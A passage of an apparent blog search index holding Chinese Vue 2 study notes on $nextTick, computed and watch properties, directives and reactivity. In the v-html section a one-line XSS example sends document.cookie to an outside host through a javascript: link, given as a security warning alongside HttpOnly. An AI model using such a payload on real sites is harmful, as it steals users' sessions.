    "url": "/posts/%E7%BB%84%E4%BB%B6%E5%AE%9E%E4%BE%8B/",
    "categories": "Vue2",
    "tags": "Vue2, VueBase",
    "date": "2023-10-22 00:00:00 +0800",
    





    
    "snippet": "      $data](https://cn.vuejs.org/api/component-instance.html#data)        $props        $el        $options        $parent        $root        $slots        $refs        $attrs        $watch()    ...",
    "content": "      $data](https://cn.vuejs.org/api/component-instance.html#data)        $props        $el        $options        $parent        $root        $slots        $refs        $attrs        $watch()        $emit()        $forceUpdate()        $nextTick() ：在下一次DOM更新结束后，执行其指定的回调          Vue在更新DOM时是异步实现的 — 异步任务在同步任务完成之后才能执行，      Vue中改变响应式状态时，开启一个缓存异步任务的队列，直到下一个“tick”才一起执行                  确保每个组件无论发生多少状态改变，都仅执行一次更新（DOM 重新计算渲染）。                    改变数据后，DOM需要重新更新，并且要基于更新后的新DOM进行某些操作                  $nextTick()在状态改变后（DOM渲染后） 立即使用，以确保操作对象是存在、状态已更新                            全局 Vue.$nextTick(callFunction, this)      当前组件 ` this.$newxTick(callFunction)   — 回调函数中的 this 将自动绑定到当前的 Vue` 实例上        $nextTick() 会返回一个 Promise 对象  // 一个回调函数作为参数this.$refs.inputTitle.disable = false // 打开输入框this.$nextTick(function(){    this.$refs.inputTitle.focus() // 同步执行时，关闭的输入框无法获取焦点})// await 返回的 Promiseasync increment() {      this.count++      // DOM 还未更新      console.log(document.getElementById('counter').textContent) // 0      await nextTick()      // DOM 此时已经更新      console.log(document.getElementById('counter').textContent) // 1}            [【源码分析】面试官：Vue中的$nextTick有什么作用？      web前端面试 - 面试官系列 (vue3js.cn)](https://vue3js.cn/interview/vue/nexttick.html#一、nexttick是什么)            定义一个定时器 — 将操作放到异步队列（promise）中，等同步事件执行完毕再执行，原理一样（即使不给时间）        Vue2 中的源码判断逻辑：是否有promist - mutationObserve -setimmediate - setTimeout    Vue3 中的源码 直接认为是promise，不是则返回一个promise  /* vue3.4 */// resolvedPromise 也是一个promiseconst resolvedPromise = /*#__PURE__*/ Promise.resolve() as Promise&lt;any&gt;// currentFlushPromise 是一个promise\tlet currentFlushPromise: Promise&lt;void&gt; | null = nullexport function nextTick&lt;T = void, R = void&gt;(  this: T, // 给 This 确定类型  fn?: (this: T) =&gt; R): Promise&lt;Awaited&lt;R&gt;&gt; {  const p = currentFlushPromise || resolvedPromise  return fn ? p.then(this ? fn.bind(this) : fn) : p // 将传入的回调放入promise中}// 调度异步任务const queue: SchedulerJob[] = [] let isFlushing = falseexport function queueJob(job: SchedulerJob) {  // 重复数据消除搜索使用 Array.includes()的startIndex参数。默认情况下，搜索索引包括正在运行的当前作业，因此它不能再次递归触发自己。如果作业是watch（）回调，则搜索将从+1索引开始，以允许它递归地触发自己——用户有责任确保它不会以无限循环结束。  // 去重  if ( !queue.length || queue.includes(      job, isFlushing &amp;&amp; job.allowRecurse ? flushIndex + 1 : flushIndex    )) {      // 没有组件id 添加到数组末尾    if (job.id == null) {      queue.push(job)    } else {// 按照jod.id 自增顺序排序      queue.splice(findInsertionIndex(job.id), 0, job)    }    queueFlush()  }}// 创建微任务function queueFlush() {  if (!isFlushing &amp;&amp; !isFlushPending) { // 不挂起 &amp;&amp; 不更新    isFlushPending = true // 将任务挂起    // 创建微任务 promise，将flushJobs放入执行    currentFlushPromise = resolvedPromise.then(flushJobs)  }}function flushJobs(seen?: CountMap) {  isFlushPending = false // Pending 挂起 不  isFlushing = true // Flushing 刷新      queue.sort(comparator) // 队列重新排队    // 1. 确保组件更新是由父组件到子组件——父组件在子组件之前创建，拥有更小更优先的编号    // 2. 父组件的更新卸载了子组件，子组件的更新就可以被跳过了      try { // 遍历队列，批量执行    for (flushIndex = 0; flushIndex &lt; queue.length; flushIndex++) {      const job = queue[flushIndex]      if (job &amp;&amp; job.active !== false) {        if (__DEV__ &amp;&amp; check(job)) {          continue        }        // console.log(`running:`, job.id)        callWithErrorHandling(job, null, ErrorCodes.SCHEDULER) // 执行！      }    }  } finally { // 执行完成后，重置状态    flushIndex = 0    queue.length = 0\t/*        watch(xxx,()=&gt;{},{          flush:'post'        })         走 flushPostFlushCbs() 方法  \t*/    flushPostFlushCbs(seen)    isFlushing = false    currentFlushPromise = null    // some postFlushCb queued jobs!    // keep flushing until it drains.    if (queue.length || pendingPostFlushCbs.length) {      flushJobs(seen)    }  }}  job 组件实例上的update()方法，生成instance.update()          const update = (instance.update = () =&gt; effect.run() ) 收集effect依赖      update.id = instance.uid vue自增的id      "
  },
  
  {
    "title": "计算属性和监视属性",
    "url": "/posts/%E8%AE%A1%E7%AE%97%E5%B1%9E%E6%80%A7%E5%92%8C%E7%9B%91%E8%A7%86%E5%B1%9E%E6%80%A7/",
    "categories": "Vue2",
    "tags": "Vue2, VueBase",
    "date": "2023-10-20 00:00:00 +0800",
    





    
    "snippet": "计算属性【案例】  插值语法实现&lt;div id=\"root\"&gt;    &lt;span&gt;姓&lt;/span&gt; &lt;input type=\"text\" v-model=\"firstName\" name=\"xin\" id=\"xin\"&gt; &lt;br&gt;    &lt;span&gt;名&lt;/span&gt; &lt;input type=\"text\" ...",
    "content": "计算属性【案例】  插值语法实现&lt;div id=\"root\"&gt;    &lt;span&gt;姓&lt;/span&gt; &lt;input type=\"text\" v-model=\"firstName\" name=\"xin\" id=\"xin\"&gt; &lt;br&gt;    &lt;span&gt;名&lt;/span&gt; &lt;input type=\"text\" v-model=\"lastName\" name=\"min\" id=\"min\"&gt; &lt;br&gt;    姓名：&lt;span&gt;{{firstName}} - {{lastName}}&lt;/span&gt; &lt;/div&gt;  methods实现姓名：&lt;span&gt;{{fullName()}}&lt;/span&gt;  &lt;!-- 插入函数的返回值，是一个值；{{fullName}} 将输出整个函数 --&gt;const vm = new Vue({    el:\"#root\",    data:{        firstName:'张',        lastName:\"三\"    },    methods:{        fullName(){            let FName = this.firstName;            let LName = this.lastName;            return `${FName} - ${LName}`        }    }})  compen实现&lt;div id=\"root\"&gt;    &lt;span&gt;姓&lt;/span&gt; &lt;input type=\"text\" v-model=\"firstName\" name=\"xin\" id=\"xin\"&gt; &lt;br&gt;    &lt;span&gt;名&lt;/span&gt; &lt;input type=\"text\" v-model=\"lastName\" name=\"min\" id=\"min\"&gt; &lt;br&gt;    姓名：&lt;span&gt;{{fullName}}&lt;/span&gt;  &lt;/div&gt;\t const vm = new Vue({     el:\"#root\",     data:{         firstName:'张',         lastName:\"三\"     },     // Vue认为 data中的是 属性:属性值; 通过属性值计算出来的值，称为计算属性     computed:{         // 存放计算属性，使用对象存放         // 计算过程配置为一个对象，里面至少要有一个getter -- 调用该计算属性时，getter会被调用，且返回值作为计算属性值         // 经过计算后，其结果才会进入 _data 里面进行劫持和代理         fullName:{             get(){                 return this.firstName + '-' + this.lastName;             }         }     } })// 简写 -- 确定计算函数不需要setter，可以直接跟一个函数，作为getter使用// 表面上是一个函数，其实是函数执行后返回结果值// 不可以使用 {{fullNmae()}} 调用，因为其本质仍然是一个属性而不是函数 computed:{    fullName() {        return this.firstName + '-' + this.lastName    } }【计算属性】      计算属性：依赖需要大量计算的属性，将计算过程提取出来，单独存放在computed中；          至少需要一个 getter，在调用后计算，计算的值存放到_data_中      在_data_中，插值符号就可以直接读取其值        :warning: 注意的细节：          依赖 已有的属性 计算出来，其他的数据、变量变化不会引起其改变      原理：Object.defineProperty方法提供的getter、setter            getter调用的时机：                  初次读取 属性时，:+1: 计算属性值会缓存起来，再次调用不会重复计算                    所依赖的属性发生变化时，即依赖的数据调用了setter        计算属性没有一个固定的值，其取值都是需要经过计算的                  计算属性的setter：          没有这个属性，不允许修改其值      单单调用setter不会引起页面上值的改变 — 其依赖的属性值没有变化      setter要同时修改其依赖的值，页面才会变化      computed: {    fullName: {        get() {            console.log(\"get背调用\");            return this.firstName + '-' + this.lastName        },        set(value) {            const str = value.split('-');            this.firstName = str[0];            this.lastName = str[1];        }    }}计算属性与监视属性的对比​\tcomputer可以完成的事情，watch也可以完成      计算属性，在初始化时可以不存在，经过计算后，存放_data_        监视属性，必须在一开始就存在，修改后才会影响_data_        计算属性是依赖项发生变化，立即计算；依赖项没有变化，则不会重新计算，而是在缓存中    将修改后的值交给定时器返回，但计算的属性在计算时没有返回值，所以页面刷新时没有拿到返回值，页面不变        监视属性，可以设置异步函数执行；计算属性，只能执行同步命令    监视函数里面的定时器（ajax等回调函数，不属于Vue管理），必须是箭头函数（往外找this，即实例vm）  监视属性应用场景： 对于值修改前后比较，超过某个阙值进行某些操作&lt;div id=\"root\"&gt;    &lt;h2&gt;今天是个{{weather}}日子&lt;/h2&gt;    &lt;button @click=\"changeWeater\"&gt;切换天气&lt;/button&gt;    &lt;!-- 当需要计算的东西，比较简单，只有一个，可以写在这里；其值在挂载的实例vm中找--&gt;    &lt;!-- 如果需要有两个值变化，最好使用method或者watch --&gt;    &lt;button @click=\"isHot = !isHot\"&gt;切换天气&lt;/button&gt;&lt;/div&gt;const vm = new Vue({    el: '#root',    data: { isHot: true },    computed: {        weather() {            return this.isHot ? '炎热' : '凉爽'        }    },    methods: {        changeWeater() { this.isHot = !this.isHot }    },    watch: {        // 对data值 监视        isHot: {                immediate: true, // 是否立即执行？ 可用于属性初始化时调用            // hardler 什么时候被调用？  -- 当监视的属性，发生变化的时候            handler(newValue, oldValue) {                console.log(newValue, oldValue);            }        },        // 对计算属性 监视        weather: {            handler(newValue, oldValue) {                console.log(newValue, oldValue);            }        }    }})// 对实例最佳监视属性：vm.$watch('监视的属性名',{   \thandler(newValue, oldValue) {        console.log(newValue, oldValue);    }});简写​\t前提：不需要 immediate， 不需要deep， 或其他配置项watch:{\tisHot(newValue, oldValue){        console.log(newValue, oldValue);    }}vm.$watch('监视的属性名',function(){    console.log(newValue, oldValue);    // this 指向调用者 vm    // 如果是箭头函数，()=&gt;{}, this指向window})深度监视​\tVue提供的 watch默认不进行多级结构监视 ， deep:true; 对多级结构进行 所有属性变化监视；​\tVue自身是可以监视到多级结构的new Vue({    el: \"#root\",    data: {        number: { a: 1 }    },    watch: {        'number.a': { // 属性默认是字符串，无法使用. 所以要转换为字符串            handler() {                console.log('a改变了');            }        },        // 如果number里面有无数多的值，无法一一监视，所以需要深度监视        // 1. 直接修改number对象 -- number是一个引用对象，内部值改变并不会影响其在内部的地址           // 2. 使用配置项 deep:true        number: {            deep: true, // 监视多级结构中所有属性的变化              handler() {                console.log('number改变了');            }        }    }})"
  },
  
  {
    "title": "Vue指令",
    "url": "/posts/Vue%E6%8C%87%E4%BB%A4/",
    "categories": "Vue2",
    "tags": "Vue2, VueBase",
    "date": "2023-10-14 00:00:00 +0800",
    





    
    "snippet": "v-cloak​\t外部js脚本引入的 位置，会影响加载的顺序；v-cloak阻止未经加载完的结构渲染到页面上  添加了v-cloak的元素，在Vue.js 实例创建、加载完成后，将去除这个v-cloak 属性  所有可以在DIV上添加v-cloak使其在为加载完时 [v-cloak]:{display:none} 隐藏其存在  而加载完后，去除了这个属性，DIV就露出来了v-once​\t只读...",
    "content": "v-cloak​\t外部js脚本引入的 位置，会影响加载的顺序；v-cloak阻止未经加载完的结构渲染到页面上  添加了v-cloak的元素，在Vue.js 实例创建、加载完成后，将去除这个v-cloak 属性  所有可以在DIV上添加v-cloak使其在为加载完时 [v-cloak]:{display:none} 隐藏其存在  而加载完后，去除了这个属性，DIV就露出来了v-once​\t只读取 元素的初始值，即第一次取的值  v-once所在节点，在初次动态渲染后，就视为静态内容  所以数据的改变不会引起所在节点的更新，可以用于优化性能v-pre​\tVue跳过所在节点的编译  应用于没有指令语法、没有使用插值语法的节点，会加快编译内容绑定V-text  v-text指令的作用是：设置标签的内容（textContent）[类似innerText]  默认写法会 替换全部内容，使用差值表达式{{ }}可以替换指定内容  设置标签的内容 （以字符串，全部输出），支持表达式V-html  v-html指令的作用是：设置元素的innerHTML  内容中有htm结构，会被解析为标签  v-text指令无论内容是什么，只会解析为文本  部分替换标签内容: {{ }}这种写法  全部替换 标签内容: v-text和x-html解析文本使用v-text，解析html结构使用v-html安全性问题      在网站上动态渲染任意的HTML都是非常危险的，容易导致XSS攻击        v-html:'&lt;a href=javascript:location.href=\"http://www.baidu.com?\"+document.cookis&gt;&lt;/a&gt;    在页面上获取 cookie，并携带跳转，将伪装登录        浏览器保护机制：cookie 设置 HttpOnly — 只有 http协议才可以读取的cookie值  事件处理绑定 v-on:new Vue({    methods:{        functionName(even){            // 第一个参数 默认是【点击事件】            // this是 调用者vm        },        functionName2:(event) =&gt; {            // 第一个参数 默认是【点击事件】            // this是 调用者window -- 不应该        }        functionName3(a,event){            // 第一个参数 是传递的参数    \t\t// 第二个参数 是点击事件            // this是 调用者vm、组件对象        }    }})&lt;button v-on:click=\"functionName\"&gt; 点击按钮，调用函数 &lt;/button&gt;&lt;button @click=\"functionName3(555,$event)\"&gt; 点击按钮，调用函数 &lt;/button&gt;      所有被Vue管理的函数，都应该是普通函数        v-on:元素绑定事件        事件名不需要写on，指令可以简写为@click,@dblclick        绑定的方法定义在methods属性中    事件绑定可写为函数调用形式，可传入自定义参数        给谁绑定，找谁触发  事件修饰符​\t事件修饰符可以连着写，顺序执行：\t@click().prevent.stop  阻止默认事件  .prevent&lt;div id=\"root\"&gt;    &lt;a href=\"http://baidu.com\" @click=\"showInfo\"&gt;点我显示提示信息&lt;/a&gt;    &lt;!-- 2. 事件修饰符.prevent 阻止默认事件 --&gt;     &lt;a href=\"http://baidu.com\" @click.prevent=\"showInfo\"&gt;点我显示提示信息&lt;/a&gt;&lt;/div&gt;const vm =  new Vue({    el:'#root',    methods:{        showInfo(e){            e.preventDefault(); // 1. 阻止 默认事件（原生写法）            alert(\"hello!\")        }    }})      阻止事件冒泡 .stop    事件冒泡：父节点和子节点同有事件，点击子节点时，事件会向父级一级一级（相同事件）发生，直至根节点。（冒泡是向外发生的，但触发的target依然是子节点）  &lt;div id=\"root\" @click=\"showInfo\"&gt;    &lt;button @click=\"showInfo\"&gt;点我 &lt;/button&gt;    &lt;!-- 2. 事件修饰符.stop 阻止冒泡事件: 给子元素加 --&gt;     &lt;button @click.stop=\"showInfo\"&gt;点我 &lt;/button&gt;&lt;/div&gt;const vm =  new Vue({    el:'#root',    methods:{        showInfo(e){            e.stopPropagation(); // 1. 阻止 冒泡事件（原生写法）            alert(\"hello!\")        }    }})  事件只触发一次 .once&lt;div id=\"root\" @click=\"showInfo\"&gt;    &lt;button @click.once=\"showInfo\"&gt;点我 &lt;/button&gt;&lt;/div&gt;      使用事件的捕获阶段 .capture    事件捕获：父节点和子节点同有事件，点击子节点时，是从父节点一级一级向内捕获目标元素的。（捕获是向内的）    在捕获期间就处理事件 — 向父级、再子级  &lt;div id=\"root\"&gt;    &lt;div class=\"box1\" @click.capture=\"showMsg(1)\"&gt; // 加了.capture后，打印 1 2        div1        &lt;div class=\"box2\" @click=\"showMsg(2)\"&gt;div2&lt;/div&gt; // 点击div2，打印 2 1    &lt;/div&gt;&lt;/div&gt;const vm = new Vue({    el: '#root',    methods: {        showMsg(value) {            console.log(value);        }    }})  只有event.target是当前的元素，才可以触发click的事件  .self&lt;div id=\"root\" @click.self=\"showInfo($event,1)\"&gt; // 有self时，1 2    &lt;button @click=\"showInfo($event,2)\"&gt;点我 &lt;/button&gt;  // 没有self时，2 1&lt;/div&gt;const vm = new Vue({    el:\"#root\",    data:{},    methods:{        showInfo(e,value){            console.log(e.target,value);        }    }})      事件默认行为立即执行，无需等待事件回调  .passive    一般情况下，事件触发后，处理完成，才会再回来执行新的触发事件 — 移动端项目使用较多  键盘和鼠标事件  鼠标事件： @Wheel— 鼠标滚轮  键盘事件：          keydown：在键盘上按下某个键时触发。                  如果按住某个键，会不断触发该事件，          该事件处理函数返回 false 时，会取消默认的动作（如输入的键盘字符，在 IE 和 Safari 浏览器下还会禁止keypress 事件响应）。                    keypress：按下某个键盘键并释放时触发。                  如果按住某个键，会不断触发该事件。          该事件处理函数返回 false 时，会取消默认的动作（如输入的键盘字符）。                    keyup：释放某个键盘键时触发。                  该事件仅在松开键盘时触发一次，不是一个持续的响应状态。                      在键盘输入某个值时，触发函数&lt;div id=\"root\" @click.self=\"showInfo($event,1)\"&gt;    &lt;!-- 原生js解决 --&gt;    &lt;input type=\"text\" placeholder=\"按下回车，显示输入内容\" @keyup=\"showInfo\"&gt;     &lt;!-- Vue添加事件修饰符 .enter --&gt;    &lt;input type=\"text\" placeholder=\"按下回车，显示输入内容\" @keyup.enter=\"showInfo\"&gt;&lt;/div&gt;const vm = new Vue({    el:\"#root\",    data:{},    methods:{        showInfo(e){            // if(e.keyCode !== 13) return;  原生js解决            console.log(e.target.value);        }    }})按键别名  Vue中提供的 常用按键别名：            按键      键名      按键      键名                  回车      enter      删除（“退格”、“删除”）      delete              退出      esc      空格      space              换行      tab                            上      up      下      down              左      left      右      right      ​\t\ttab 将焦点从当前元素切走，没抬起来就失去焦点了，程序检测不到；使用@keydown.tab，一按下就检测到      Vue中未提供的，可以使用原始keyCode绑定（不建议）、或需要转为caps-lock（两个单词组成，都小写，中间-隔开）    系统修饰键（用法特殊） — CTRL、alt、shift、meta          keyup:  按下修饰键的同时，需要再按下另一个其他键，释放其他键，事件才会触发      keydown：按下修饰键，正常触发      两个键配合触发 .ctrl.y        自定义别名： Vue.config.keyCodes.自定义键名 = 键码显示绑定V-show  设置数据是否显示  DOM标签仍然存在，不能用于权限操作，样式隐藏，位置不保留  与&lt;template&gt;组队使用，无效  频繁切换使用V-if  使用布尔值判断，直接作用于数据标签是否存在  DOM标签在false值时，直接被移除， 建议与&lt;template&gt;组队使用  不频繁切换使用，单次判断（与v-else、v-else-if使用时不能打断）绑定属性V-Bind  语法\t// 完整写法: v-bind:属性名,简写:属性名\t&lt;img v-bind:src='imgSrc'&gt;\t&lt;img v-bind:title='imgTitle'+111&gt;\t&lt;img v-bind:class=\"isActive?'active':''\"&gt;\t&lt;img v-bind:class=\"{active:isActive}\"&gt;  需要动态增删class，建议使用对象的方式      绑定方式: 对象语法(:class=对象名)          对象名:                  'key':value          'className':boolean：如果boolean值为真,则显示改类名;否则为空          className: functionName() — return className（可返回多个样式类名）                    用法:                  直接绑定 &lt;h2 :calss=\"{'active':isActive}\"&gt; hello &lt;/h2&gt;          判断传入多个值 &lt;h2 :calss=\"{'active':isActive, 'line':isLine}\"&gt; hello &lt;/h2&gt;          与普通的类同时存在 &lt;h2 class='title' :class={'active':isActive}&gt; hello &lt;/h2&gt;          将参数放入方法/计算 &lt;h2 :class=\"classes\"&gt; hello &lt;/h2&gt; 。                          绑定方式: 数组语法(:class=数组)          参数:              参数为'active'时,作为字符串      参数为active时,作为变量              用法                  直接绑定 &lt;h2 :class=\"[active]\"&gt;Hello world&lt;/h2&gt;          传入多个值 &lt;h2：class=\"[active,line]\"&gt;Hello world&lt;/h2&gt;          与普通的类同时存在 &lt;h2 class=\"title\"：class=\"[active,line]\"&gt;Hello world&lt;/h&gt;          将参数放入方法/计算 &lt;h2 class=\"title\"：class=\"classes\"&gt;Hello world&lt;/h2&gt;                          绑定多个属性值：（引入组件需要多个配置值时）          v-bind( {marginTop:5px, backgroud:#333} )      列表渲染列表循环 v-for  想生成谁，就在谁身上使用for&lt;div id=\"root\"&gt;    &lt;ul&gt;        &lt;!-- 【遍历数组】 --&gt;        &lt;li v-for=\"(item, id) in person\" :key=\"id\"&gt;{{item.name}} + {{item.id}}&lt;/li&gt;        &lt;!-- 【遍历对象】先值，后键 --&gt;        &lt;li v-for=\"(value, key) in car\" :key=\"key\"&gt;{{key}} :: {{value}}&lt;/li&gt;        &lt;!-- 【遍历字符串】先字母，再下标 --&gt;        &lt;li v-for=\"(item, index) in str\" :key=\"index\"&gt;{{item}} -- {{index}}&lt;/li&gt;            &lt;/ul&gt;&lt;/div&gt;  根据数据生成列表结构  结合的数据类型可为: 数组，对象，数字，字符串，迭代器  (item,index) in 数据 可自动生成数据个数的列表标签,内容为item,索引以0开始  在标签结构内，循环参数可重复使用(在作用域内)  响应式: 数组长度的更新同步在页面上! :keykey 指导Vue的虚拟DOM算法diff时，区别是不同的元素，从而避免被认为重复对象而被移除      key给Vue虚拟DOM算法diff使用，生成真实的DOM时:key会被删除掉        index作为key时，涉及逆序插入、逆序删除元素时，        结构中如果有 输入类的DOM 会产生歧义，产生错误DOM更新        导致没有必要的真实DOM更新    如果不涉及破坏顺序的操作，仅用于渲染列表展示，可以使用:key = \"index\"  数据绑定单项数据绑定 v-bind​\t页面改变值，不会影响Vue.data中的值；Vue.data中的值如果改变，页面的值也会动态绑定双向数据绑定 V-model​\t页面改变值，会影响Vue.data的值；同样相关的页面也会变化  只能应用于 输入类元素 ，（有value值的元素：input等）获取和设置表单元素的值（双向数据绑定）  简写：v-model=\"message” ，直接等于变量名v-model:value=\"message\"  绑定的数据和表达元素的值相关联自定义指令      命名：                  调用时：使用 v-XXX        ​\t多个单词组成时，不识别大写字母，使用 - 分隔                    定义时：不用加 v- ， 直接XXX        ​\t多个单词组成时，使用 ‘字段串’ 包起来表示                  this指向 — directives的this 都指向window    使用Vue中的数据，需要从绑定的指令中传过来        钩子函数：                  bind：只调用一次，指令第一次绑定到元素时调用。                              （在内存中建立关系）此时的元素还未加载到页面，许多操作无效                                可以设置 样式、值、绑定方法等                                      inserted：被绑定元素插入父节点时调用 (仅保证父节点存在，但不一定已被插入文档中)。                  可以设置 获取焦点、操作父元素等                            update：所在组件的 VNode 更新时调用，但是可能发生在其子 VNode 更新之前。                              将覆盖 插入页面时的指令效果                                再次执行时，元素已经加载到页面上了                                      componentUpdated：指令所在组件的 VNode 及其子 VNode 全部更新后调用。                    unbind：只调用一次，指令与元素解绑时调用。                  传入的参数          element：指令所绑定的元素，可以用来直接操作 DOM。      binding ：一个对象，包含以下属性：                  name：指令名，不包括 v- 前缀。          value：指令的绑定值                          📜 保存传入的JavaScript 对象字面量，{ color: 'white' } — binding.value.color 取值                                expression：字符串形式的指令表达式。例如 v-my-directive=\"1 + 1\" 中，表达式为 \"1 + 1\"。          arg：传给指令的参数，可选。例如 v-my-directive:foo 中，参数为 \"foo\"。          modifiers：一个包含修饰符的对象。例如：v-my-directive.foo.bar 中，修饰符对象为 { foo: true, bar: true }。          oldValue：指令绑定的前一个值，仅在 update 和 componentUpdated 钩子中可用。无论值是否改变都可用                    vnode：Vue 编译生成的虚拟节点。移步 VNode API 来了解更多详情。      oldVnode：上一个虚拟节点，仅在 update 和 componentUpdated 钩子中可用。      // Vue 全局定义Vue.directive('指令名',configObj)Vue.directive('指令名',callBackFunction)// 当前组件 局部定义new Vue({    directives: {        big: function (element, binding) {}  // 函数形式，默认只用 bind + update        fbind: {} // 对象形式，可以配置多钩子    } })       函数形式 与 对象形式的区别 — 没有inserted                  获得焦点，需要该结构已经加载到页面上；否则无法获得焦点                    控制父元素，需要该结构已经加载到页面上；否则不知道谁是父元        有一些操作，需要在该结构挂载到DOM上，才能有上下文环境操作            "
  },
  
  {
    "title": "Vue实例",
    "url": "/posts/Vue%E5%AE%9E%E4%BE%8B/",
    "categories": "Vue2",
    "tags": "Vue2, VueBase",
    "date": "2023-10-11 00:00:00 +0800",
    





    
    "snippet": "两个参数​\t【Vue实例与对象的关系是 1：1】一个实例接管一个容器      后面的容器不生效、重复的Vue同挂载实例会报错        容器只能使用Vue实例提供的内容    【v.$mount(el, data); 在已经声明的Vue实例追加挂载】    el：\"挂载点\" 或者 document.getElementById('id名')  （字符串类型，指定Vue实例服务的容器） ...",
    "content": "两个参数​\t【Vue实例与对象的关系是 1：1】一个实例接管一个容器      后面的容器不生效、重复的Vue同挂载实例会报错        容器只能使用Vue实例提供的内容    【v.$mount(el, data); 在已经声明的Vue实例追加挂载】    el：\"挂载点\" 或者 document.getElementById('id名')  （字符串类型，指定Vue实例服务的容器）          确定命中的元素及其内部的后代元素      建议使用id选择器      可以设置双标签(除了html和body标签)        data: 数据 （被el挂载的容器，才可以使用data里面的数据）          可以写复杂类型 对象： obj、数组array、函数method等      data()也可以是一个函数，使用了闭包，必须返回一个对象                  让单页面的Vue达到各个组件有独立的私有变量空间，从而不会相互影响污染全局          不建议使用了纯对象，使得同名对象指向同一个内存空间地址，互相干扰          此处的this指向vue实例对象 — Vue调用data函数                    在页面容器内使用data的值 {{js表达式（会返回值的js代码） / data变量名}}      data内的内容，会进行数据代理、数据劫持      /* Vue.data的写法*/new Vue({\tel:'#idName',\tdata: { } /* 对象写法 */\tdata(){   /* 匿名函数写法 */\t\treturn{ name: \"\" }\t\t}\tdata:function(){ /* 函数写法 */        return{ name:\"\" }    }\t/* 一定不能用 箭头函数写法，箭头函数没有this，向上级找this=window是错误的，应该是Vue实例调用 */})  Vue实例的作用范是什么呢？  是否可以使用其他的选择器？  是否可以设置其他的dom元素呢？模块语法  插值语法   {{% js表达式 %}}          给标签体内容动态指定data里面的值 — data最后会挂载到Vue实例上，所以 —      作为一个Vue实例，可以访问到实例里面的所有属性值（包括原型）： {{ $children / 属性名 }}        指令语法 — 给标签动态指定体内容、属性、方法 — &lt;a :href=\" js表达式 \"&gt;&lt;/a&gt; 或 v-bind:href=\" js表达式 \"          解析标签（当所在的模板重新解析式，将被调用） — 包括标签属性 、体内容、绑定事件方法等      可以读取到data中的所有属性      数据代理对象添加属性 defineProperty()​\tObject.defineProperty( ObjectName, \"属性名\", {value: 属性值})​\t该属性值不可以枚举 Object.keys(person)读取不到  使用场景：数据劫持、计算属性、数据代理Vue的数据代理​\t通过一个对象的代理对另一个对象中属性的操作（读、写）let obj = { x:100; }let obj2 = { y:200; }Object.defineProperty(obj2,'x',{\tget(){\t\treturn obj.x; // obj2原本没有x属性值，它拿obj.x值作为自己的值    },    set(value){        obj.x = value;  // 当有人修改obj2.x的值时，就是修改obj.x的值    }})console.log(obj2.x); // 100  obj2.x = 39;      // 通过obj2的代理，实现了obj中属性的操作console.log(obj.x); // 39​\t在Vue中，实例vm.data的值，在实际中存放在 ·vm._data中，其数据劫持的实现功能：​\t\t\t\tvm._data存在一个数据劫持（劫持实现 数据变动，页面修改）；  vm要修改 _data中的值，会在里面添加name:getter属性，可以直接vm.name==19;修改data里面的属性值  vm要读取 _data中的值，会在里面添加name:setter属性，可以以``读取到data里面的属性值​\t创建实例时传入的配置对象称为options，取里面的值的做options.data​\t【通过vm对象，代理data对象中的属性操作】const vm = new Vue({    el:'#root',    data:{        name:\"李四;    }})vm.name = \"王五\"; // vm.name 触发了name属性的setter，其修改了data中的值变化// 页面中的数据也会改变​\t页面中``为李四，当修改 vm.name = '李四' 时，data中的数据会变化，数据劫持  观察者模式​\t如果有改动_data_ — 即调用.set，则会调用视图更新  使用定时器监视数据变动var data = {    name: 'nni',    address: 'ndd',    list:[1,2,3,4],    obj:{name:1,age:2}}// 监视改值-- 只能监视一个变量，执行操作var tmp = 'nni'setInterval(() =&gt; {    if (data.name !== tmp) {        tmp = data.name;        console.log('data.name被修改，需要更新视图了');    }}, 1000); // 程序一直在执行  手动添加 get、set — 陷入死循环// what? -- 手动给data添加 get、set// how? -- 将会陷入死循环// why? --Object.defineProperty(data,'name',{    get(){        return data.name; // `.` == get(), 导致不断回调 get()    },    set( val ){        data.name = val // `=` == set(), 导致不断回调 set()    }})  观察者模式// 定义观察模式function Observer(obj) {    const keys = Object.keys(obj); // 拿到obj身上的所有属性    keys.forEach((key) =&gt; { // 箭头函数，this指向Observer类        Object.defineProperty(this, key, {  // 在Observer类上添加 obj上有的属性，并给每一个属性增加get、set            get() { return obj[key] },            set(val) {                 obj[key] = val;                // 属性值被修改，更新视图                // updateView(JSON.parse(JSON.stringify(obj[key] = val)));                if(obj[key] instanceof Array){                    console.log('array');                    vm.$set(obj,obj[key],val);                }else if(obj[key] instanceof Object){                    console.log('obj');                    vm.$set(obj,obj[key],val);                }else{                    vm.$set(obj,obj[key],val);                }            }            // this是Observer，避免了调用和读取都是data导致的死循环        })    });}// 创建一个观察者var obs = new Observer(data); // data中的数据被观察者监视// var vm = {} // 模拟Vue实例对象vm._data = data = obs;视图监视数据更新​\tVue会监视data中 所有层级 的数据  通过set()实现监视          要在 new Vue 时传入需要监测的数据，才能实现检测      对象、数组中追加的属性，Vue默认不做响应式处理        对象添加属性响应式：          Vue.set(target, propertyName/index, value)      vm.$set(target, propertyName/index, value)        数组添加元素响应式：          通过重写数组 更新元素 的方法，实现响应式：                  调用原生对应的方法，对数组进行更新          重新解析模板，对比不同，进而更新页面                    必须调用 原生的更新原生方法 ：push() pop() shfit() unshift() splice() sort() reverse()      或者使用 Vue.set() 和 vm.$set() 方法        数组使用 不影响原数组的方法（filter、concat、:warning: Vue.set() 和 vm.$set 不能给vm或vm的根数据对象（包括_data_）添加响应式属性methods: {    addObjSex() {        this.$set(this.student, 'sex', \"男\")        Vue.set(this.student,'sex','男')    },    addArrFri() {        this.student.friends.unshift({name:'anmy',age:28})        this.$set(this.student,'friends',[{name:'anmy',age:28},...this.student.friends])        Vue.set(this.student, 'friends', [{ name: 'anmy', age: 28 }, ...this.student.friends])    },    updateArrFri() {        this.student.friends.splice(0, 1, { name: \"张三\", age: 93 })        this.student.friends[0].name = \"张三\"  // students.friends 作为数组没有 get、set；但数组项的属性有    },    addArrHobby() {        this.student.hobby.push('学习')\t    },    updateArrHobby() {        this.student.hobby.splice(0,1,'开车')        this.$set(this.student.hobby, 0, '开车')    },    removeArrHobby() {        let hob = JSON.parse(JSON.stringify(this.student.hobby))        let newHob = hob.filter((item) =&gt; {            if(item !== '抽烟'){                console.log(item);                return item            }        })        this.student.hobby = newHob; // 将Vue._data中的数据直接替换掉，触发页面更新    }}"
  },
  
  {
    "title": "Vue路由",
    "url": "/posts/Vue%E8%B7%AF%E7%94%B1/",
    "categories": "Vue2",
    "tags": "Vue2, VueBase",
    "date": "2023-10-07 00:00:00 +0800",
    





    
